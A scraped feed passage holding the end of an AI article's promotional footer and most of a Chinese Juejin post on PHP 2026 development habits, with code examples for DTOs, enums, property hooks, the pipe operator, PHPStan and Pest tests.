<p><strong>结语</strong>：真正的AI，不应只是“更聪明的工具”，而应成为“有思想的伙伴”。而这一次，我们让十位帝王，成为了我们的思想伙伴。</p>
</blockquote>
<h2 data-id="heading-21">ending</h2>
<p>我创建了一个读者 AI 交流及搞钱群，群里都是一群前沿的 AI 极客，经常讨论最新的 AI 消息，用法，以及变现方法。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41fac24edfd14780b006b6a244725792~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=11QqBIvb5u2HE7dfnob9GUxNEIA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>但是任何人在群里打任何广告，都会被我 T 掉。
如果你对这个特别的群，感兴趣，可以公众号后台私信我加入。
暗号：AI</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年 PHP 开发者进阶 快速高效开发学习习惯]]></title>    <link>https://juejin.cn/post/7589838714450657321</link>    <guid>https://juejin.cn/post/7589838714450657321</guid>    <pubDate>2025-12-31T23:48:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838714450657321" data-draft-id="7589838714450640937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年 PHP 开发者进阶 快速高效开发学习习惯"/> <meta itemprop="keywords" content="PHP,后端"/> <meta itemprop="datePublished" content="2025-12-31T23:48:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年 PHP 开发者进阶 快速高效开发学习习惯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T23:48:29.000Z" title="Wed Dec 31 2025 23:48:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2026 年 PHP 开发者进阶 快速高效开发学习习惯</h2>
<h3 data-id="heading-1">为什么 2026 年的进阶方式不同了</h3>
<p>2026 年，成为更好的 PHP 开发者，靠的不是记住更多语法技巧，而是养成<strong>复利习惯</strong>——那些可重复的小实践，每周都在悄悄改善代码库。</p>
<p>行业的方向很明确：</p>
<ul>
<li><strong>PHP 变得更具表达力、更安全</strong>（PHP 8.4 和 8.5 带来的改进，日常工作中都能感受到）</li>
<li><strong>工具变得更严格，也更有价值</strong>——能捕获那些一直让我们付出代价的生产故障（类型错误、null 处理、不安全的数组、不完整的重构）</li>
<li><strong>安全和供应链成为工程基础</strong>，不再是某个独立部门的事（Composer audit 和 OWASP 思维已经是常见词汇）</li>
</ul>
<p>所以 2026 年的进阶公式不是励志海报，而是一套习惯：</p>
<ul>
<li>减少意外</li>
<li>缩短反馈循环</li>
<li>让正确性比聪明更容易</li>
</ul>
<p>接下来介绍真正有效的习惯——不是纸上谈兵。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Flevel-up-php-developer-high-impact-habits" target="_blank" title="https://catchadmin.com/post/2026-01/level-up-php-developer-high-impact-habits" ref="nofollow noopener noreferrer">原文 2026 年 PHP 开发者进阶 快速高效开发学习习惯</a></p>
<h3 data-id="heading-2">习惯 1：把升级当作每周维护，别等到年底恐慌</h3>
<p>PHP 8.5 于 2025 年 11 月 20 日发布，包含管道操作符、URI 扩展、克隆时修改属性等改进开发体验的功能。</p>
<p>PHP 8.4 引入了属性钩子和非对称可见性——都能减少样板代码，降低意外修改的风险。</p>
<p>具体功能不是重点，重要的是信号：现代 PHP 让代码更容易做到：</p>
<ul>
<li>明确表达不变量</li>
<li>难以被误用</li>
<li>安全重构</li>
</ul>
<h4 data-id="heading-3">实用的升级习惯（可扩展到多个仓库）</h4>
<p>每周（或每两周）做一次简短的升级检查：</p>
<ol>
<li>升级依赖的补丁版本</li>
<li>运行测试 + 静态分析</li>
<li>持续发布小升级</li>
</ol>
<p>避免"六个月依赖雪崩"阻塞真正的工作。</p>
<p><strong>具体步骤：</strong></p>
<p><strong>1. 固定平台版本，让 Composer 在不同机器上解析一致：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"require"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"php"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.3"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"platform"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"php"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8.3.0"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>2. 在 CI 中添加"未来 PHP"版本的任务，提前处理兼容性：</strong></p>
<ul>
<li>保持主运行时稳定</li>
<li>添加第二个任务，在下一个小版本上运行测试</li>
<li>逐步修复不兼容</li>
</ul>
<p><strong>3. 读官方发布说明，别只看博客摘要</strong></p>
<p>官方 PHP 8.5 和 8.4 发布公告简短且可操作。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>不再把"学习 PHP"当作琐碎知识，而是把它当作一个活跃的运行时——它会改变工程约束。</p>
<h3 data-id="heading-4">习惯 2：把"数据边界"作为默认架构策略</h3>
<p>大多数 PHP 生产 bug 都不奇特，通常是：</p>
<ul>
<li>数组缺少键</li>
<li>字符串应该是 int</li>
<li>可空值没被当作可空处理</li>
<li>"临时"输入格式变成了永久格式</li>
</ul>
<p>修复方法无聊但强大：<strong>尽早把不可信输入转换成类型化对象，别在系统里传原始数组。</strong></p>
<h4 data-id="heading-5">简单的 DTO 边界（框架无关）</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateOrderInput</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$customerId</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$totalCents</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$currency</span>,
    </span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;customerId === <span class="hljs-string">''</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'customerId is required'</span>);
        }
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;totalCents &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'totalCents must be positive'</span>);
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^[A-Z]{3}$/'</span>, <span class="hljs-variable">$this</span>-&gt;currency)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'currency must be ISO-4217 like "USD"'</span>);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fromArray</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span></span>): <span class="hljs-title">self</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>(
            customerId: (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'customerId'</span>] ?? <span class="hljs-string">''</span>),
            totalCents: (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'totalCents'</span>] ?? <span class="hljs-number">0</span>),
            currency: <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-title function_ invoke__">trim</span>((<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'currency'</span>] ?? <span class="hljs-string">''</span>))),
        );
    }
}
</code></pre>
<p>服务层不用猜了，接收的是保证的结构。</p>
<h4 data-id="heading-6">用枚举表示"允许的值"，别用注释</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">OrderStatus</span>: <span class="hljs-title">string</span>
</span>{
    <span class="hljs-keyword">case</span> Created = <span class="hljs-string">'CREATED'</span>;
    <span class="hljs-keyword">case</span> Paid = <span class="hljs-string">'PAID'</span>;
    <span class="hljs-keyword">case</span> Cancelled = <span class="hljs-string">'CANCELLED'</span>;
}
</code></pre>
<p>这样就消除了：</p>
<ul>
<li>无效字符串状态</li>
<li>拼写错误 bug</li>
<li>一半的 <code>if ($status === '...')</code> 混乱</li>
</ul>
<h4 data-id="heading-7">想要"可读但不可写"时用非对称可见性</h4>
<p>PHP 8.4 的非对称可见性非常适合不应从外部修改的领域对象。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shipment</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$status</span> = <span class="hljs-string">'CREATED'</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">markInTransit</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;status = <span class="hljs-string">'IN_TRANSIT'</span>;
    }
}
</code></pre>
<p><strong>为什么这个习惯有用：</strong></p>
<p>不再依赖纪律（"请传正确的结构"），而是依赖约束（"不正确就快速失败"）。</p>
<h3 data-id="heading-8">习惯 3：把不变量放在它保护的状态旁边</h3>
<p>很多 PHP 代码库里，验证是分散的：</p>
<ul>
<li>控制器验证一点</li>
<li>服务验证一点</li>
<li>仓储再验证一点</li>
<li>生产环境还是出现"不可能"的状态</li>
</ul>
<p>PHP 8.4 属性钩子能在属性访问时强制执行规则，不用写无尽的 setter 样板。</p>
<h4 data-id="heading-9">现实的不变量："已付金额不能超过总额"</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Money</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$currency</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$cents</span>,
    </span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;cents &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Money cannot be negative'</span>);
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^[A-Z]{3}$/'</span>, <span class="hljs-variable">$this</span>-&gt;currency)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Invalid currency'</span>);
        }
    }
}

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Invoice</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> Money <span class="hljs-variable">$total</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> Money <span class="hljs-variable">$paid</span> {
        <span class="hljs-title function_ invoke__">set</span> (Money <span class="hljs-variable">$value</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span>-&gt;currency !== <span class="hljs-variable language_">$this</span>-&gt;total-&gt;currency) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Currency mismatch'</span>);
            }
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span>-&gt;cents &gt; <span class="hljs-variable language_">$this</span>-&gt;total-&gt;cents) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Overpayment not allowed'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;paid = <span class="hljs-variable">$value</span>;
        }
    }
}
</code></pre>
<p><strong>注意：</strong> 别用钩子隐藏 IO 或副作用。钩子用于验证和转换；IO 保持显式。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>领域规则更难绕过，重构时更容易推理。</p>
<h3 data-id="heading-10">习惯 4：用管道操作符让转换可读</h3>
<p>PHP 8.5 包含管道操作符，最适合可预测的命名转换。</p>
<p>在请求规范化、映射和数据塑形中会立即感受到——这些地方 PHP 代码经常变成嵌套调用或"临时变量汤"。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trimAll</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">'trim'</span>, <span class="hljs-variable">$xs</span>);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dropEmpty</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$xs</span>, fn(<span class="hljs-variable">$x</span>) =&gt; <span class="hljs-variable">$x</span> !== <span class="hljs-string">''</span>));
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lower</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_map</span>(fn(<span class="hljs-variable">$x</span>) =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$x</span>), <span class="hljs-variable">$xs</span>);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unique</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-variable">$xs</span>));
}

<span class="hljs-variable">$tags</span> = [<span class="hljs-string">'  PHP '</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'Backend'</span>, <span class="hljs-string">'php'</span>, <span class="hljs-string">'backend '</span>];

<span class="hljs-variable">$normalized</span> = <span class="hljs-variable">$tags</span>
    |&gt; <span class="hljs-title function_ invoke__">trimAll</span>(...)
    |&gt; <span class="hljs-title function_ invoke__">dropEmpty</span>(...)
    |&gt; <span class="hljs-title function_ invoke__">lower</span>(...)
    |&gt; <span class="hljs-title function_ invoke__">unique</span>(...);

<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$normalized</span>);
</code></pre>
<p><strong>经验法则：</strong> 每个步骤能用 2-4 个词总结，管道就有帮助。步骤需要一段话，就别内联。</p>
<p><strong>为什么这个习惯有用：</strong></p>
<p>意图更清晰，减少审查时间和重构风险。</p>
<h3 data-id="heading-11">习惯 5：把静态分析加入日常反馈循环</h3>
<p>静态分析是 PHP 中最可靠的"技能倍增器"之一。原因很简单：PHP 灵活，灵活性就是 bug 藏身之处。</p>
<p>PHPStan 2.0 是重要里程碑（2024 年发布，2025 年广泛采用）。</p>
<p>不用静态分析，就是选择在运行时发现本可以在编译时发现的问题。</p>
<h4 data-id="heading-12">不会引起反抗的采用策略</h4>
<p>从能实现的级别开始，然后收紧。</p>
<p>示例 <code>phpstan.neon</code>：</p>
<pre><code class="hljs language-neon" lang="neon">parameters:
  level: 6
  paths:
    - src
  reportUnmatchedIgnoredErrors: true
</code></pre>
<p>在 CI 中：</p>
<pre><code class="hljs language-bash" lang="bash">vendor/bin/phpstan analyse --memory-limit=1G
</code></pre>
<p>然后迭代：</p>
<ul>
<li><strong>级别 6</strong>：清理明显问题</li>
<li><strong>级别 7-8</strong>：强制更好的类型和 null 处理</li>
<li><strong>级别 9-10</strong>：仅在代码库准备好后</li>
</ul>
<h4 data-id="heading-13">最重要的实践：给数组加类型</h4>
<p>未类型化的数组会让分析失效。尽可能用 DTO，数组不可避免时就注释：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> array&lt;int, array{sku: string, qty: int}&gt;
 */</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseItems</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span></span>): <span class="hljs-title">array</span>
</span>{
    <span class="hljs-variable">$items</span> = [];
    <span class="hljs-keyword">foreach</span> ((<span class="hljs-variable">$payload</span>[<span class="hljs-string">'items'</span>] ?? []) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) {
        <span class="hljs-variable">$items</span>[] = [
            <span class="hljs-string">'sku'</span> =&gt; (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$row</span>[<span class="hljs-string">'sku'</span>] ?? <span class="hljs-string">''</span>),
            <span class="hljs-string">'qty'</span> =&gt; (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$row</span>[<span class="hljs-string">'qty'</span>] ?? <span class="hljs-number">0</span>),
        ];
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$items</span>;
}
</code></pre>
<p><strong>为什么这个习惯有用：</strong></p>
<p>学会表达正确性约束，工具成为始终在线的审查者。</p>
<h3 data-id="heading-14">习惯 6：写保护业务规则的测试，别只追求覆盖率</h3>
<p>2026 年，测试工具继续与现代 PHP 对齐：</p>
<ul>
<li>PHPUnit 11 需要 PHP 8.2+</li>
<li>Pest 4 目标 PHP 8.3+</li>
</ul>
<p>这不是琐事，是信号：要用现代测试工具，运行时得跟上。</p>
<h4 data-id="heading-15">测什么（高 ROI 目标）</h4>
<p>时间有限就测那些关乎金钱或信任的规则：</p>
<ul>
<li>折扣和舍入</li>
<li>幂等性（重复支付请求）</li>
<li>权限检查（谁能看到什么）</li>
<li>取消/退款窗口</li>
<li>库存预留</li>
</ul>
<p>一个能捕获真实 bug 的小例子：舍入行为。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Discount</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">apply</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$priceCents</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$percent</span></span>): <span class="hljs-title">int</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$percent</span> &lt; <span class="hljs-number">0</span> || <span class="hljs-variable">$percent</span> &gt; <span class="hljs-number">100</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'percent must be 0..100'</span>);
        }
        <span class="hljs-variable">$cut</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$priceCents</span> * (<span class="hljs-variable">$percent</span> / <span class="hljs-number">100</span>));
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$priceCents</span> - <span class="hljs-variable">$cut</span>);
    }
}
</code></pre>
<p>Pest 风格测试（紧凑但可读）：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-title function_ invoke__">it</span>(<span class="hljs-string">'applies discount with correct rounding'</span>, function () {
    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Discount</span>();
    <span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">999</span>, <span class="hljs-number">10</span>))-&gt;<span class="hljs-title function_ invoke__">toBe</span>(<span class="hljs-number">899</span>); <span class="hljs-comment">// 99.9 rounds to 100</span>
    <span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">apply</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">10</span>))-&gt;<span class="hljs-title function_ invoke__">toBe</span>(<span class="hljs-number">900</span>);
});

<span class="hljs-title function_ invoke__">it</span>(<span class="hljs-string">'rejects invalid percent'</span>, function () {
    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Discount</span>();
